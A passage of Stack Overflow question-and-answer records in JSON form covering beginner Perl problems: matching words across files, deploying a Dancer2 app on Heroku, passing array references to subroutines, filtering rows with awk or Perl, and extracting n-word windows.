"https://stackoverflow.com/questions/37899315/perl-program-to-find-matching-words-in-a-paragraph", "title": "Perl program to find matching words in a paragraph", "body": "\n<p>I have two text files.</p>\n<p>The first one has a list of words, like the following:</p>\n<h3>File 1.txt</h3>\n<pre class=\"lang-none prettyprint-override\"><code>Laura\nSamuel\nGerry\nPeter\nMaggie\n</code></pre>\n<p>The second one has paragraphs on it. For example</p>\n<h3>File2.txt</h3>\n<pre class=\"lang-none prettyprint-override\"><code>Laura\nis\nabout\nto\nmeet\nGerry\nand\nis\nplanning\nto\ntake\nPeter\nalong\n</code></pre>\n<p>All I want the program to do is look for common words and print <code>MATCH</code> beside the matching words in <code>File2.txt</code> or to a third output file.</p>\n<p>So the desired output should look like this.</p>\n<pre class=\"lang-none prettyprint-override\"><code>Laura | MATCH\nis\nabout\nto\nmeet\nGerry | MATCH\nand\nis\nplanning\nto\ntake\nPeter | MATCH\nalong\n</code></pre>\n<p>I have tried the following code, however I am not getting the desired output.</p>\n<pre class=\"lang-perl prettyprint-override\"><code>use warnings;\nuse strict;\n\nuse Data::Dumper;\n\nmy $result = { };\n\nmy $first_file  = shift || 'File1.txt';\nmy $second_file = shift || 'File2.txt';\nmy $output      = 'output2.txt';\n\nopen my $a_fh, '&lt;', $first_file  or die &quot;$first_file: $!&quot;;\nopen my $b_fh, '&lt;', $second_file or die &quot;$second_file: $!&quot;;\n\nopen( OUTPUT,  '&gt;' . $output ) or die &quot;Cannot create $output.\\n&quot;;\n\nwhile ( &lt;$a_fh&gt; ) {\n    chomp;\n    next if /^$/;\n    $result-&gt;{$_}++;\n}\n\nwhile ( &lt;$b_fh&gt; ) {\n\n    chomp;\n\n    next if /^$/;\n\n    if ( $result-&gt;{$_} ) {\n        delete $result-&gt;{$_};\n        $result-&gt;{ join &quot; |&quot; =&gt; $_, &quot;MATCH&quot; }++;\n    }\n    else {\n        $result-&gt;{$_}++;\n    }\n}\n\n{\n    $Data::Dumper::Sortkeys = 0;\n    print OUTPUT Dumper $result;\n}\n</code></pre>\n<p>But the output that I am getting is like this.</p>\n<pre class=\"lang-none prettyprint-override\"><code>Laura  | MATCH\nSamuel | MATCH\ntake\nMaggie | MATCH\nLaura\nabout\nto\nGerry\nmeet\nGerry | MATCH\nand\nis\nMaggie |MATCH\nplanning\nto\nPeter |MATCH\ntake\nPeter |MATCH\n</code></pre>\n<p>The output is not in a paragraph format, nor is it printing <code>MATCH</code> for all matches.</p>\n<p>Please advise.</p>\n"}, {"tags": ["perl", "heroku", "dancer"], "answers": [{"tags": [], "owner": {"reputation": 184, "user_id": 6115421, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/15a623fe6b5c826ee955a1474fc1723e?s=128&d=identicon&r=PG&f=1", "display_name": "Dragos Trif", "link": "https://stackoverflow.com/users/6115421/dragos-trif"}, "is_accepted": false, "score": 0, "last_activity_date": 1467996644, "creation_date": 1467996644, "answer_id": 38271879, "question_id": 37896454, "link": "https://stackoverflow.com/questions/37896454/h10-error-after-deploying-a-dancer2-app-on-heroku/38271879#38271879", "title": "H10 error after deploying a Dancer2 app on heroku", "body": "<p>So i could't deploy my Dancer2 app on Heroku with the Perloku buildpack which worked for Mojolicius. So i worked around it using: miyagawa/heroku-buildpack-perl.\nThe steps for deployment where:\n1)From my terminal in my main app dir i created a symbolic link with the comand:</p>\n\n<pre><code>ln -s bin/app.psgi\n</code></pre>\n\n<p>2)Inside my link i added the following code: <code>use lib 'lib'</code></p>\n\n<p>Then typed this commands in my terminal:</p>\n\n<pre><code>3)git init\n4)git add .\n5)git commit -m \"Dancer on Heroku\"\n6)git heroku login \n7)heroku create --buildpack https://github.com/pnu/heroku-buildpack-perl\n8)git push heroku master\n</code></pre>\n"}], "owner": {"reputation": 184, "user_id": 6115421, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/15a623fe6b5c826ee955a1474fc1723e?s=128&d=identicon&r=PG&f=1", "display_name": "Dragos Trif", "link": "https://stackoverflow.com/users/6115421/dragos-trif"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 91, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1467996644, "creation_date": 1466249603, "last_edit_date": 1466276405, "question_id": 37896454, "link": "https://stackoverflow.com/questions/37896454/h10-error-after-deploying-a-dancer2-app-on-heroku", "title": "H10 error after deploying a Dancer2 app on heroku", "body": "<p>I've tried to deploy a small Dancer2 app on Heroku using the Perloku buildpack. The app is as simple as it gets is just The Dancer2 start page.\nI seems to be successfully deployed but when i try to run it, it crashes . In the logs i have the following messages :</p>\n\n<pre><code>2016-06-18T10:39:36.571202+00:00 heroku[slug-compiler]: Slug compilation finshed\n2016-06-18T10:39:36.571190+00:00 heroku[slug-compiler]: Slug compilation started\n2016-06-18T10:39:40.377632+00:00 heroku[web.1]: Starting process with command `./Perloku`\n2016-06-18T10:39:43.357773+00:00 heroku[web.1]: State changed from crashed to starting\n2016-06-18T10:39:45.136117+00:00 heroku[web.1]: Starting process with command `./Perloku`\n2016-06-18T10:39:49.412546+00:00 heroku[web.1]: State changed from starting to crashed\n016-06-18T10:39:53.156458+00:00 heroku[router]: at=error code=H10 desc=\"App crashed\" method=GET path=\"/favicon.ico\" host=fathomless-oasis-51363.herokuapp.com request_id=b4944cb8-e8a8-4d22-87ae-335dfa4d8701 fwd=\"89.123.89.141\" dyno= connect= service= status=503 bytes=\n</code></pre>\n\n<p>In order to deploy i followed this steps:</p>\n\n<ol>\n<li>In my terminal i typed the command dancer2 -a myapp.</li>\n<li><p>cd myapp/bin then chmod +x app.psgi.\n3.In my main app directory inside the MAKEFILE.PL i added the lines:</p>\n\n<pre><code>EXE_FILES     =&gt; ['/bin/app.psgi'],\nPREREQ_PM     =&gt; {\n    YAML    =&gt; 1.15,\n},\n</code></pre></li>\n<li><p>Created an executable file called Perloku which has the following lines:</p>\n\n<pre><code>#!/bin/sh\n\n./bin/app.psgi daemon -l http://*:$PORT -m production\n</code></pre></li>\n<li><p>Deployed with these steps:</p>\n\n<pre><code>git init\ngit add .\ngit commit -m \"Initial version\"\nheroku create -s cedar --buildpack http://github.com/judofyr/perloku.git\ngit push heroku master\n</code></pre></li>\n</ol>\n"}, {"tags": ["arrays", "perl", "reference", "subroutine"], "answers": [{"comments": [{"owner": {"reputation": 816, "user_id": 1249519, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/vWpvo.jpg?s=128&g=1", "display_name": "Sunil", "link": "https://stackoverflow.com/users/1249519/sunil"}, "edited": false, "score": 0, "creation_date": 1466238661, "post_id": 37894691, "comment_id": 63243537, "body": "Thanks a lot for the help. That worked. But still I am unable to understand the difference between my $arrayref = @_ and my ($arrayref) = @_. Could you please let me know the difference? Thanks"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "reply_to_user": {"reputation": 816, "user_id": 1249519, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/vWpvo.jpg?s=128&g=1", "display_name": "Sunil", "link": "https://stackoverflow.com/users/1249519/sunil"}, "edited": false, "score": 0, "creation_date": 1466238754, "post_id": 37894691, "comment_id": 63243558, "body": "I told you the difference. Can you explain which part is unclear?"}, {"owner": {"reputation": 816, "user_id": 1249519, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/vWpvo.jpg?s=128&g=1", "display_name": "Sunil", "link": "https://stackoverflow.com/users/1249519/sunil"}, "edited": false, "score": 0, "creation_date": 1466238959, "post_id": 37894691, "comment_id": 63243596, "body": "I dint understand how putting braces around $arrayref evaluates in array context."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "reply_to_user": {"reputation": 816, "user_id": 1249519, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/vWpvo.jpg?s=128&g=1", "display_name": "Sunil", "link": "https://stackoverflow.com/users/1249519/sunil"}, "edited": false, "score": 0, "creation_date": 1466239101, "post_id": 37894691, "comment_id": 63243632, "body": "I didn&#39;t use braces and there is no &quot;array context&quot;. I&#39;m also unclear on what you mean by &quot;how&quot;. What kind of answer are you looking for? The perl interpreter source code that implements it?"}, {"owner": {"reputation": 816, "user_id": 1249519, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/vWpvo.jpg?s=128&g=1", "display_name": "Sunil", "link": "https://stackoverflow.com/users/1249519/sunil"}, "edited": false, "score": 0, "creation_date": 1466239511, "post_id": 37894691, "comment_id": 63243711, "body": "I am passing reference to an array to subroutine. So when I wrote the code i thought reference should be stored in a scaler which is why i tried to store using my $arraryref = @_. So probably i should have done something like this my $arrayref = $_[0]; right?. I guess this seems to work as well."}, {"owner": {"reputation": 42833, "user_id": 18914, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7a20a39ae2ef47ae042a3eddd5b5bd19?s=128&d=identicon&r=PG", "display_name": "Dave Sherohman", "link": "https://stackoverflow.com/users/18914/dave-sherohman"}, "reply_to_user": {"reputation": 816, "user_id": 1249519, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/vWpvo.jpg?s=128&g=1", "display_name": "Sunil", "link": "https://stackoverflow.com/users/1249519/sunil"}, "edited": false, "score": 2, "creation_date": 1466239567, "post_id": 37894691, "comment_id": 63243724, "body": "@Sunil: With the parentheses, you&#39;re assigning the list in the array <code>@_</code> to the variables in the list <code>($arrayref)</code>, so the assignment takes place in list context.  (Note: Not &quot;array context&quot;. There&#39;s technically no such thing. An array is just a variable that holds a list.) Without the parentheses, you&#39;re assigning the array <code>@_</code> to the scalar <code>$arrayref</code>, so it&#39;s done in scalar context and you get the number of items in the array rather its contents."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1466239710, "post_id": 37894691, "comment_id": 63243756, "body": "Correct, <code>my $arrayref = $_[0];</code> also works, but it&#39;s harder to extend later if you want to add/remove/rearrange parameters, because you have to keep track of array indices yourself."}, {"owner": {"reputation": 816, "user_id": 1249519, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/vWpvo.jpg?s=128&g=1", "display_name": "Sunil", "link": "https://stackoverflow.com/users/1249519/sunil"}, "edited": false, "score": 0, "creation_date": 1466241121, "post_id": 37894691, "comment_id": 63244104, "body": "@melpomene Thanks a lot for clarifying. I think now i got to know the difference between list and array."}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "reply_to_user": {"reputation": 816, "user_id": 1249519, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/vWpvo.jpg?s=128&g=1", "display_name": "Sunil", "link": "https://stackoverflow.com/users/1249519/sunil"}, "edited": false, "score": 1, "creation_date": 1466248955, "post_id": 37894691, "comment_id": 63246112, "body": "@Sunil, you could also do <code>my $arrayref = shift;</code>. <code>shift</code> takes the first element of the arguments coming in in scalar context, and puts it into <code>$arrayref</code>."}], "tags": [], "owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "is_accepted": true, "score": 10, "last_activity_date": 1466238877, "last_edit_date": 1466238877, "creation_date": 1466236657, "answer_id": 37894691, "question_id": 37894642, "link": "https://stackoverflow.com/questions/37894642/how-to-modify-array-elements-using-subroutine-in-perl/37894691#37894691", "title": "How to modify array elements using subroutine in Perl", "body": "<p>You should start every Perl file you write with <code>use strict; use warnings;</code>. That will help you avoid errors like this.</p>\n\n<p>The problem is in this line:</p>\n\n<pre><code>    my $arrayref = @_;\n</code></pre>\n\n<p>You're assigning an array to a scalar, so the array is evaluated in scalar context, which yields the number of elements in the array.</p>\n\n<p>What you should do instead is:</p>\n\n<pre><code>    my ($arrayref) = @_;\n</code></pre>\n\n<p>Now it's using list assignment, putting the first function argument into <code>$arrayref</code> (and ignoring the rest, if any).</p>\n\n<p>List assignment is documented in <a href=\"http://perldoc.perl.org/perldata.html#List-value-constructors\"><code>perldoc perldata</code></a> (the part starting with \"<em>Lists may be assigned to</em> ...\").</p>\n"}], "owner": {"reputation": 816, "user_id": 1249519, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/vWpvo.jpg?s=128&g=1", "display_name": "Sunil", "link": "https://stackoverflow.com/users/1249519/sunil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1616, "favorite_count": 0, "accepted_answer_id": 37894691, "answer_count": 1, "score": 1, "last_activity_date": 1466254273, "creation_date": 1466236331, "last_edit_date": 1466254273, "question_id": 37894642, "link": "https://stackoverflow.com/questions/37894642/how-to-modify-array-elements-using-subroutine-in-perl", "title": "How to modify array elements using subroutine in Perl", "body": "<p>I am trying to modify an array passed to a subroutine.</p>\n\n<p>I am passing an array reference to the subroutine and assigning new values but it is not getting reflected in the caller side.</p>\n\n<p>Below is my program. </p>\n\n<pre><code>sub receiveArray {\n    my $arrayref = @_;\n    @{$arrayref} = ( 4, 5, 6 );\n}\n\n@ar = ( 1, 2, 3 );\n\nprint \"Values of the function before calling the function\\n\";\n\nforeach my $var ( @ar ) {\n    print $var;\n    print \"\\n\";\n}\n\nreceiveArray(\\@ar);\n\nprint \"Values of the function after calling the function\\n\";\n\nforeach my $var ( @ar ) {\n    print $var;\n    print \"\\n\";\n}\n</code></pre>\n\n<p>What is the problem in the above code?</p>\n"}, {"tags": ["python", "perl", "shell"], "comments": [{"owner": {"reputation": 9833, "user_id": 4407666, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/AqwYj.jpg?s=128&g=1", "display_name": "Rahul K P", "link": "https://stackoverflow.com/users/4407666/rahul-k-p"}, "edited": false, "score": 0, "creation_date": 1466235795, "post_id": 37894532, "comment_id": 63242911, "body": "Is Python relevant here ?"}, {"owner": {"reputation": 31, "user_id": 6476344, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206613482286395/picture?type=large", "display_name": "Kapil N Joshi", "link": "https://stackoverflow.com/users/6476344/kapil-n-joshi"}, "reply_to_user": {"reputation": 9833, "user_id": 4407666, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/AqwYj.jpg?s=128&g=1", "display_name": "Rahul K P", "link": "https://stackoverflow.com/users/4407666/rahul-k-p"}, "edited": false, "score": 0, "creation_date": 1466235879, "post_id": 37894532, "comment_id": 63242937, "body": "rahul sir if its giving me desired output then it is"}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 6476344, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206613482286395/picture?type=large", "display_name": "Kapil N Joshi", "link": "https://stackoverflow.com/users/6476344/kapil-n-joshi"}, "edited": false, "score": 0, "creation_date": 1466250933, "post_id": 37894596, "comment_id": 63246655, "body": "but its replacing the 3rd column by 1"}], "tags": [], "owner": {"reputation": 33775, "user_id": 315228, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/g17T4.jpg?s=128&g=1", "display_name": "SMA", "link": "https://stackoverflow.com/users/315228/sma"}, "is_accepted": false, "score": 1, "last_activity_date": 1466236036, "creation_date": 1466236036, "answer_id": 37894596, "question_id": 37894532, "link": "https://stackoverflow.com/questions/37894532/delete-fulfilling-condition-row-from-a-file/37894596#37894596", "title": "delete fulfilling condition row from a file", "body": "<p>Use awk simply like:</p>\n\n<pre><code>awk '{if ($3 != $4 &amp;&amp; $8 != \"Inf\") { print $0 } }' myfile.txt\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 31, "user_id": 6476344, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206613482286395/picture?type=large", "display_name": "Kapil N Joshi", "link": "https://stackoverflow.com/users/6476344/kapil-n-joshi"}, "edited": false, "score": 0, "creation_date": 1466251246, "post_id": 37894641, "comment_id": 63246736, "body": "if values are \\t seperated"}, {"owner": {"reputation": 81, "user_id": 6473477, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e6326c9a3d3bdce1210d263b550b7f8?s=128&d=identicon&r=PG&f=1", "display_name": "masteryoom", "link": "https://stackoverflow.com/users/6473477/masteryoom"}, "reply_to_user": {"reputation": 31, "user_id": 6476344, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206613482286395/picture?type=large", "display_name": "Kapil N Joshi", "link": "https://stackoverflow.com/users/6476344/kapil-n-joshi"}, "edited": false, "score": 0, "creation_date": 1466252422, "post_id": 37894641, "comment_id": 63247072, "body": "It should work with all white space, but if it doesn&#39;t, then you can put &quot;\\t&quot; as an argument to line.split() so that it splits by only \\t"}], "tags": [], "owner": {"reputation": 81, "user_id": 6473477, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e6326c9a3d3bdce1210d263b550b7f8?s=128&d=identicon&r=PG&f=1", "display_name": "masteryoom", "link": "https://stackoverflow.com/users/6473477/masteryoom"}, "is_accepted": false, "score": 0, "last_activity_date": 1466236330, "creation_date": 1466236330, "answer_id": 37894641, "question_id": 37894532, "link": "https://stackoverflow.com/questions/37894532/delete-fulfilling-condition-row-from-a-file/37894641#37894641", "title": "delete fulfilling condition row from a file", "body": "<p>A python solution to this would be:</p>\n\n<pre><code>file = open(\"myfile.txt\")\nfile2 = open(\"myfile2.txt\", \"a\")\nfor i, line in enumerate(file)\n    strList = line.split()\n    if not (strList[2] == strList[3] and strList[7] == \"inf\"):\n        file2.write(line)\nfile.close()\nfile2.close()\n</code></pre>\n\n<p>this assumes that the values are separated by spaces</p>\n"}, {"tags": [], "owner": {"reputation": 1371, "user_id": 5056806, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bfa01ad122fc89b571651ffbbc34ce37?s=128&d=identicon&r=PG&f=1", "display_name": "Claes Wikner", "link": "https://stackoverflow.com/users/5056806/claes-wikner"}, "is_accepted": false, "score": -1, "last_activity_date": 1466267994, "last_edit_date": 1466267994, "creation_date": 1466262017, "answer_id": 37898359, "question_id": 37894532, "link": "https://stackoverflow.com/questions/37894532/delete-fulfilling-condition-row-from-a-file/37898359#37898359", "title": "delete fulfilling condition row from a file", "body": "<pre><code>awk '!$3==$4||$8!~/inf/' file\nchrM 1114 A A 555 G 52 9.8 xyz\nchrM 1184 A A 400 G 50 8 cxv\nchrM 1148 p q 500 G 100 5 asad\n</code></pre>\n\n<p>Made a mistake hopefully corrected now.</p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1466265867, "last_edit_date": 1466265867, "creation_date": 1466265547, "answer_id": 37898926, "question_id": 37894532, "link": "https://stackoverflow.com/questions/37894532/delete-fulfilling-condition-row-from-a-file/37898926#37898926", "title": "delete fulfilling condition row from a file", "body": "\n\n<p>In Perl, the solution is pretty much a transcription of your question</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>perl -ane 'print unless $F[2] eq $F[3] and $F[7] eq \"inf\"' data.txt\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>chrM 1114 A A 555 G 52 9.8 xyz\nchrM 1184 A A 400 G 50 8 cxv\nchrM 1148 p q 500 G 100 5 asad\n</code></pre>\n\n<p>Could you not even have made an attempt at that? The <a href=\"http://perldoc.perl.org/\" rel=\"nofollow\">Perl documentation</a> is very good, and is also installed as part of the Perl distribution and available through the <code>perldoc</code> command on your computer</p>\n"}], "owner": {"reputation": 31, "user_id": 6476344, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206613482286395/picture?type=large", "display_name": "Kapil N Joshi", "link": "https://stackoverflow.com/users/6476344/kapil-n-joshi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "answer_count": 4, "score": -1, "last_activity_date": 1466267994, "creation_date": 1466235504, "question_id": 37894532, "link": "https://stackoverflow.com/questions/37894532/delete-fulfilling-condition-row-from-a-file", "title": "delete fulfilling condition row from a file", "body": "<p>I have a file</p>\n\n<pre><code>chrM 1114 A A 555 G 52 9.8 xyz\nchrM 1256 A A 555 G 0  inf xac\nchrM 1184 A A 400 G 50 8 cxv\nchrM 1148 p q 500 G 100 5 asad\nchrM 2500 x x 555 v 0  inf dad\n</code></pre>\n\n<p>here the 2nd last column is the ratio of  $5/$6 \nI want to do delete those line where\n $3=$4  and $8=inf if this whole condition satisfies then it should delete that line\nexpected output</p>\n\n<pre><code>chrM 1114 A A 555 G 52 9.8 xyz\nchrM 1184 A A 400 G 50 8 cxv\nchrM 1148 p q 500 G 100 5 asad\n</code></pre>\n\n<p>i tried to do </p>\n\n<pre><code>while $3=$4\ndo if %8=inf\ndo -d \ndone\ndone \n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 24966, "user_id": 2001031, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/bd4f0d39f82be9c22f6f01c80d7ad800?s=128&d=identicon&r=PG", "display_name": "Neil Slater", "link": "https://stackoverflow.com/users/2001031/neil-slater"}, "edited": false, "score": 0, "creation_date": 1466233179, "post_id": 37894188, "comment_id": 63242324, "body": "What you are looking for is n-grams. Google &quot;n-grams Perl&quot; and you will find many ways to do this, including modules on CPAN."}, {"owner": {"reputation": 69, "user_id": 6460438, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/723b11450e87030f3a93810ef0f53642?s=128&d=identicon&r=PG&f=1", "display_name": "Greg", "link": "https://stackoverflow.com/users/6460438/greg"}, "edited": false, "score": 0, "creation_date": 1466233271, "post_id": 37894188, "comment_id": 63242342, "body": "you go throw the file. For each line, you split it by the <i>space</i> character.  <code>for(int i = 0; i &lt; array.size(); i+=2)  {     &#47;&#47; first word     print(array[i]);     print(array[i+1]);     &#47;&#47; second word     print(array[i+2]);     print(array[i+3]);     &#47;&#47; third word     print(array[i+4]);     print(array[i+5]); }</code> I let you check the corner cases (array not empty...)"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1466236871, "post_id": 37894188, "comment_id": 63243132, "body": "So where&#39;s your code? What have you tried?"}, {"owner": {"reputation": 12533, "user_id": 931027, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lWhaB.jpg?s=128&g=1", "display_name": "Kusalananda", "link": "https://stackoverflow.com/users/931027/kusalananda"}, "edited": false, "score": 0, "creation_date": 1466236965, "post_id": 37894188, "comment_id": 63243155, "body": "The data that you provide is not the same data that you show in the expected result. &quot;<code>with &quot;with&quot; his &quot;his&quot;</code>&quot; is repeated on the last and second-to-last lines."}], "answers": [{"comments": [{"owner": {"reputation": 19192, "user_id": 257635, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/El2tc.jpg?s=128&g=1", "display_name": "Chankey Pathak", "link": "https://stackoverflow.com/users/257635/chankey-pathak"}, "edited": false, "score": 0, "creation_date": 1472813590, "post_id": 37894840, "comment_id": 65914906, "body": "You may accept your own answer. <a href=\"https://blog.stackoverflow.com/2009/01/accept-your-own-answers/\">blog.stackoverflow.com/2009/01/accept-your-own-answers</a>"}], "tags": [], "owner": {"reputation": 27, "user_id": 5618951, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/f64af1c8dfefafdb01b1b63aba0bd9e0?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel", "link": "https://stackoverflow.com/users/5618951/daniel"}, "is_accepted": false, "score": 0, "last_activity_date": 1466238247, "last_edit_date": 1466238247, "creation_date": 1466237934, "answer_id": 37894840, "question_id": 37894188, "link": "https://stackoverflow.com/questions/37894188/extract-n-words-from-string-using-perl/37894840#37894840", "title": "Extract n words from string using Perl", "body": "<p>thank you all for your helps, i found a solution, it works, but it's in dirty code i think, that's why i asked this question, to find a better solution, the awk solution seems great but the result not like i look, </p>\n\n<p>This is the solution i fixed the window at 7 words and in front of each word it's POS and it's lemmetized form: \nhe \"he\" \"PRO\" went \"go\" \"V\" to \"to\" \"PREP\" school \"school\" \"N\" ...</p>\n\n<pre><code>open(F,\"/home/file.txt\")||die \"error\";\n\nmy $string;\n\nwhile($ligne = &lt;F&gt; ) {\n\nmy @val = split(/ /, $ligne);\nmy $long=$#val;\n\nfor($i=0; $i&lt;$long;$i+=3){  \n\n\n$string=\"$val[$i] $val[$i+1] $val[$i+2] $val[$i+3] $val[$i+4] $val[$i+5] $val[$i+6] $val[$i+7] $val[$i+8] $val[$i+9] $val[$i+10] $val[$i+11] $val[$i+12] $val[$i+13] $val[$i+14] $val[$i+15] $val[$i+16] $val[$i+17] $val[$i+18] $val[$i+19] $val[$i+20]\";\n\nmy @val2 = split(/ /, $string);\nmy $long2=$#val2;\nif($long2 &gt;19){ #if length superior at 19, (3*7)\nprint FILEOUT \"$string\\n\";\n$string=\"\";\n}\n\n       }\n\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 368, "user_id": 6430078, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204857806084476/picture?type=large", "display_name": "Sergio Bernardo", "link": "https://stackoverflow.com/users/6430078/sergio-bernardo"}, "is_accepted": false, "score": 0, "last_activity_date": 1466673714, "creation_date": 1466673714, "answer_id": 37987381, "question_id": 37894188, "link": "https://stackoverflow.com/questions/37894188/extract-n-words-from-string-using-perl/37987381#37987381", "title": "Extract n words from string using Perl", "body": "<p>This script starts by reading the entire line as an array of words (@words) and then uses an @aux array as a FIFO... discarding the first 2 elements at each pass and keeping the FIFO size always 6 itens... then, reapeat while there are words in the @words array:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\n\nmy $file = 'file.txt';\nopen(F,$file)||die \"error\";\nmy @aux;\nwhile(&lt;F&gt;) {\n  my @words = split /\\s+/;\n  while($#words &gt;= 0) {\n    while($#aux &lt; 5 &amp;&amp; $#words &gt;= 0) {\n      my $a = shift @words;\n      push @aux, $a;\n    }\n    print ((join \" \", @aux).\"\\n\");\n    shift @aux;\n    shift @aux;\n  }\n}\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 5618951, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/f64af1c8dfefafdb01b1b63aba0bd9e0?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel", "link": "https://stackoverflow.com/users/5618951/daniel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 494, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1466673714, "creation_date": 1466232939, "last_edit_date": 1466242951, "question_id": 37894188, "link": "https://stackoverflow.com/questions/37894188/extract-n-words-from-string-using-perl", "title": "Extract n words from string using Perl", "body": "<p>i have a text containing sentences in each line, and in front of each word its lemmetize form exemple:</p>\n\n<p>he \"he\" went \"go\" to \"to\" school \"school\" with \"with\" his \"his\" freinds \"freind\"</p>\n\n<p>i would like to extract for example three by three word in in each line. The result seems like this:</p>\n\n<p>he \"he\" went \"go\" to \"to\" \\n<br>\nwent \"go\" to \"to\" school \"school\" \\n<br>\nto \"to\" school \"school\" with \"with\" \\n<br>\nschool \"school\" with \"with\" his \"his\" \\n<br>\nwith \"with\" his \"his\" freinds \"freind\" \\n</p>\n\n<p>I'd like to do this using Perl.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1466232905, "post_id": 37894105, "comment_id": 63242260, "body": "Do you mean 75x10^7? Or am I counting things wrong ..."}, {"owner": {"reputation": 57, "user_id": 5098071, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/903a54b41a713d250f114e1e32e25444?s=128&d=identicon&r=PG&f=1", "display_name": "sangramjit basu", "link": "https://stackoverflow.com/users/5098071/sangramjit-basu"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1466240181, "post_id": 37894105, "comment_id": 63243872, "body": "I meant 75000000 :) ..."}, 